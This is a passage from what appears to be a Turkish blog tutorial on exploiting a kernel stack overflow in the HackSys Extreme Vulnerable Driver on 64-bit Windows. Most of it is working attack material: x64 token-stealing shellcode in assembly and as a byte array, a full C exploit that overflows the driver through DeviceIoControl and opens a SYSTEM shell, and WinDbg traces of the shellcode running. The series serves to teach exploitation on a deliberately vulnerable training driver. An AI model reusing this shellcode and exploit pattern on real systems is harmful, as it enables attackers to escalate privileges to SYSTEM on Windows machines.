   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B
```

Bunu yapıyorlar çünkü 64 bit sistemde veri yapıların16 bayt değerine göre hizalanıyor. Bu nedenle çekirdek modundaki herhangi bir veri yapısına olan göstericinin son 4 biti her zaman 0 oluyor. Windows bu yoksayılan 4 biti ise bu nesneye yapılan referans sayılarını tutmak için kullanıyor.

```
0: kd> dt _EX_FAST_REF 0xfffffa8003d10248
ntdll!_EX_FAST_REF
   +0x000 Object           : 0xfffff8a0`00004bb8 Void
   +0x000 RefCnt           : 0y1000
   +0x000 Value            : 0xfffff8a0`00004bb8
```  

Burada `0xfffff8a000004bb8` değerinin son 4 bitini sıfırlarsak "*Token*" nesnesine ulaşabiliriz:

```
0: kd> !token (0xfffff8a0`00004bb8 & 0xffffffff`fffffff0)
_TOKEN 0xfffff8a000004bb0
TS Session ID: 0
User: S-1-5-18
User Groups: 
 00 S-1-5-32-544
    Attributes - Default Enabled Owner 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-11
    Attributes - Mandatory Default Enabled 
 03 S-1-16-16384
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-18
Privs: 
 02 0x000000002 SeCreateTokenPrivilege            Attributes - 
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default 
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default 
 08 0x000000008 SeSecurityPrivilege               Attributes - 
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
 10 0x00000000a SeLoadDriverPrivilege             Attributes - 
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default 
 12 0x00000000c SeSystemtimePrivilege             Attributes - 
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default 
 17 0x000000011 SeBackupPrivilege                 Attributes - 
 18 0x000000012 SeRestorePrivilege                Attributes - 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 28 0x00000001c SeManageVolumePrivilege           Attributes - 
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default 
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - 
 32 0x000000020 SeRelabelPrivilege                Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
Authentication ID:         (0,3e7)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: *SYSTEM*           TokenFlags: 0x2000 ( Token NOT in use ) 
Token ID: 3eb              ParentToken ID: 0
Modified ID:               (0, 3ec)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 0

```

O halde tüm bu bildiklerimize dayanarak "*shellcode*"umuz için şöyle bir şeyler yazabiliriz:

```assembly
[BITS 64]

%define SYSTEM_PID 0x4
%define TOKEN_OFFSET 0x80
%define KTHREAD_OFFSET 0x188
%define EPROCESS_OFFSET 0x70
%define PROCESSLIST_OFFSET 0x188
%define CURRENTPROC_OFFSET 0x208

;------------------------------------------------------------------------------
    push rax                            ; rax yazmacını yigina yedekle (geri donus degeri)
    mov rdx, [gs:KTHREAD_OFFSET]        ; Çalışan işlemciğin KTHREAD veri yapısı (PsGetCurrentProcess)
    mov r11, [rdx + EPROCESS_OFFSET]    ; r11 = Şimdiki İşlemin EPROCESS yapisi
    mov r10, [r11 + PROCESSLIST_OFFSET] ; r10 = ActiveProcessLinks (LIST_ENTRY)
    mov rcx, [r10]                      ; rcx = ListEntry->Next, yani sonraki EPROCESS
sistemi_bul:
    mov rdx, [rcx - 8]                  ; rdx = İncelenen işlemin belirteci 
    cmp rdx, SYSTEM_PID                 ; 4 mü?
    jz bulundu                          ; eveeet!
    mov	rcx, [rcx]                      ; değil, rcx = ListEntry->Next
    jmp sistemi_bul                     ; yukarı kaç
bulundu:
    mov rax, [rcx + TOKEN_OFFSET]       ; Aha! Sistem geldi, Token adresini al
    and al, 0xf0                        ; İşimize yaramayan son 4 biti sıfırla (0xf0 = 1111 0000)
bizi_yukselt:
    mov [r11 + CURRENTPROC_OFFSET], rax ; Bizim işlemin "Token"inin yerine koy
    ...
    ...
```

İşte "*shellcode*"umuz bu kadar. Amma velakin, bu "*shellcode*"u kullanırsak sistem yine mavi ekran verecektir. Peki neden? Çünkü taşma olduktan hatırlayın ne oldu, kod dönmesi gereken yere değil, bizim kodumuza dallandı. E şimdi o zaman tekrar geldiği yere geri dönmesi gerekiyor. Normal şartlar altında eğer biz yığını bozmasaydık, uygulama `TriggerStackOverflow` fonksiyonunu çağıracak, bu fonksiyondan çıkarken de çağırıldığı yere geri dönecekti fakat biz artık yığının bozduğumuz için kodun geri dönmesini sağlayacak kısma hiçbir zaman erişemiyor. Bu nedenle biz sanki geri dönmüş hissini oluşturmamız gerekiyor. Aşağıda fonksiyon geri döndüğünde ne tür bir komutun çalışacağını görüyorsunuz:

![](/files/donulecekyer.jpg)

Hmm. Demek ki sadece yığında ufak bir temizlik yapıp (0x28 bayt kadar), sonra `ret` komutunu çalıştırırsak, sürücü buraya geldiği yere geri dönüp çalışmaya devam edecek. O halde "*shellcode*"'umuzun sonuna gelmesi gereken son parça da şöyle:

```assembly
cikis:
    pop rax                             ; rax yazmacini geri al
    add rsp, 28h                        ; Çalışma bozulmasın diye yığını düzelt
    ret                                 ; Geldiğin yere geri dön
```

Evet! Heyacanlı bekleyişin sonuna yaklaştık. Bu aşamadan sonra bir "assembler" kullanarak yazdığımız "*shellcode*"u derleyip, C uygulamamıza dahil ediyoruz. "*Exploit*"imizin son halini görelim ve çalıştırıp bakalım neler olacak...

```c
#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

int main()
{
	BOOL Result             = FALSE;
	DWORD Retval            = 0;
	PUCHAR pBuffer          = NULL;
	const DWORD BufferSize  = 2056 + 8;
	HANDLE hDeviceHandle    = INVALID_HANDLE_VALUE;
	const WCHAR* DeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	//
	// "Token" calan parcacik
	//
	unsigned char cakal[61] = {
		0x50, 0x65, 0x48, 0x8B, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4C, 0x8B,
		0x5A, 0x70, 0x4D, 0x8B, 0x93, 0x88, 0x01, 0x00, 0x00, 0x49, 0x8B, 0x0A,
		0x48, 0x8B, 0x51, 0xF8, 0x48, 0x83, 0xFA, 0x04, 0x74, 0x05, 0x48, 0x8B,
		0x09, 0xEB, 0xF1, 0x48, 0x8B, 0x81, 0x80, 0x00, 0x00, 0x00, 0x24, 0xF0,
		0x49, 0x89, 0x83, 0x08, 0x02, 0x00, 0x00, 0x58, 0x48, 0x83, 0xC4, 0x28,
		0xC3
	};

	//
	// Parcacigin alanini calistirilabilir yap
	//
	DWORD oldProtect;
	VirtualProtect(cakal, sizeof(cakal), PAGE_EXECUTE_READWRITE, &oldProtect);

	printf("*** Cekirdegi Kitliyoruz - Yigin Tasmasi ***\n");

	//
	// Surucuye tutamak al
	//
	hDeviceHandle = CreateFile(
		DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if(hDeviceHandle == INVALID_HANDLE_VALUE)
	{
		printf("Surucuye tutamak alamiyoruz?!\n");
		goto RETURN;
	}

	printf("Hop, tutamak geldi : %p\n", hDeviceHandle);

	//
	// Veriyi hazırla
	// 
	pBuffer = (PUCHAR)VirtualAlloc(
		NULL,
		BufferSize,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if(!pBuffer)
	{
		printf("2018'de bos hafiza kalmamis?!\n");
		goto RETURN;
	}

	//
	// 2056 bayt -> çöp veri
	// sonraki 8 bayt -> `ret` ile dönülecek yer
	//
	memset(pBuffer, 0x41, 2056);
	*(unsigned long long*)(pBuffer + 2056) = (unsigned long long)cakal;

	Result = DeviceIoControl(
		hDeviceHandle,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		pBuffer,
		BufferSize,
		NULL,
		0,
		&Retval,
		NULL);

    printf("Evet, emaneti yolladik! Sonuc : %d\n", Result);
	system("cmd");

RETURN:

	if(pBuffer)
	{
		//VirtualFree(pBuffer, 0 , MEM_RELEASE);
		//pBuffer = NULL;
	}

	if(hDeviceHandle)
	{
		CloseHandle(hDeviceHandle);
	}

    return 0;
}
```

Derleyip çalıştırdığımızda aldığımız sonuç ise şu şekilde:

![](/files/cekirdegikitladik.jpg)

Bu arada, eğer işleyişi daha detaylı görmek isterseniz -ki, kesinlikle tavsiye ediyorum-  Windbg içerisinden `StackOverflowIoctlHandler` fonksiyonuda bir durma noktası tanımlayıp, devamında bu durma noktasına geldiğinizde kullanıcı modundan gönderilen veriyi analiz edip "*shellcode*"umuz başlangıcına bir durma noktası koyarak satır satır çalıştırıp gözlerinizle olan biteni inceleyebilirsiniz. 

```
2: kd> x /D /f HEVD!Stack*
HEVD!StackOverflowGSIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)
	fffff880`05317710 HEVD!StackOverflowIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)

2: kd> bp HEVD!StackOverflowIoctlHandler
2: kd> g
****** HACKSYS_EVD_STACKOVERFLOW ******
Breakpoint 0 hit
HEVD!StackOverflowIoctlHandler:
	fffff880`05317710 4883ec28        sub     rsp,28h

2: kd> t 2
HEVD!StackOverflowIoctlHandler+0x4:
fffff880`05317714 488b4a20        mov     rcx,qword ptr [rdx+20h]
HEVD!StackOverflowIoctlHandler+0x8:
fffff880`05317718 8b5210          mov     edx,dword ptr [rdx+10h]

2: kd> bp poi(rcx+0n2056)
2: kd> g
[+] UserBuffer: 0x0000000000030000
[+] UserBuffer Size: 0x810
[+] KernelBuffer: 0xFFFFF880058DCFA0
[+] KernelBuffer Size: 0x800
[+] Triggering Stack Overflow
Breakpoint 1 hit
00000000`0022fbf4 50              push    rax

2: kd> u
00000000`0022fbf4 50              push    rax
00000000`0022fbf5 65488b142588010000 mov   rdx,qword ptr gs:[188h]
00000000`0022fbfe 4c8b5a70        mov     r11,qword ptr [rdx+70h]
00000000`0022fc02 4d8b9388010000  mov     r10,qword ptr [r11+188h]
00000000`0022fc09 498b0a          mov     rcx,qword ptr [r10]
00000000`0022fc0c 488b51f8        mov     rdx,qword ptr [rcx-8]
00000000`0022fc10 4883fa04        cmp     rdx,4
00000000`0022fc14 7405            je      00000000`0022fc1b

```

Evet, yazı dizimizin ilk yazısının sonuna geldik. Gördüğünüz gibi çekirdek modunda yığın taşması zafiyetinin temel mantığı oldukça basit, hatta kullanıcı modundakinin tamamen aynısı. Tek farkı, yazacağınız "*shellcode*" kullanıcı modundakinden farklı oluyor ve sistemin çökmesini engellemeniz gerekiyor. Sonraki yazılardan birinde bu yığın taşmasının SMEP/SMAP açık olduğunda nasıl "*exploit*" edilebileceğini de göstereceğim. Aslında bi minicik ipucu vereyim, biraz geriye dönük çalışacağız sadece, hehe. 

İnşallah en kısa zamanda diğer yazıda görüşmek üzere, sevgiler.


[^1]: "*Exploit*" kelimesi için Türkçe ne kullanabiliriz? Şahsen Sömürgeç kelimesini öneriyorum, başka fikri olan?
[^2]: **SMEP** (Supervisor Mode Execution Prevention) - Çekirdek modundaki bir kodun, kullanıcı modundaki bir alanda kod çalıştırmasını engelleyen güvenlik mekanizması.
[^3]: **SMAP** (Supervisor Mode Access Prevention) - Çekirdek modundaki bir kodun, kullanıcı modundaki bir alandaki veriye direkt olarak erişimi engelleyen güvenlik mekanizması.
[^4]: "*Shellcode*" kelimesi için Türkçe ne kullanabiliriz? Ağırlıklı olarak "Kabuk Kod" kelimesinin kullanıldığını sanıyorum fakat bana çok düz bir çeviri gibi geliyor.
[^5]: **Parametre**, fonksiyonun imzasında bulunan elemanlardan bahsedilirken kullanılır, **Argüman** ise bu fonksiyon çağırılırken parametrelere verilen değerlerden bahsedilirken kullanılır.
